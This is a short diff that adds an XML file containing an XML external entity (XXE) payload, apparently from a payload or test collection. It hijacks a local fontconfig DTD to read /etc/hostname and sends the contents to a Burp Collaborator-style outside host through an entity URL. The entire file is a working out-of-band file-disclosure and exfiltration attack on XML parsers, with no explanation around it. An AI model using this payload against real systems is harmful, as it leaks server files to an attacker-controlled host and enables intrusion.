@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+    <!ENTITY % expr 'aaa)>
+        <!ENTITY &#x25; srt SYSTEM "file:///etc/hostname">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;http://a.&#x25;srt;.burp.collab/&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
+    %local_dtd;
+]>
+<message></message>
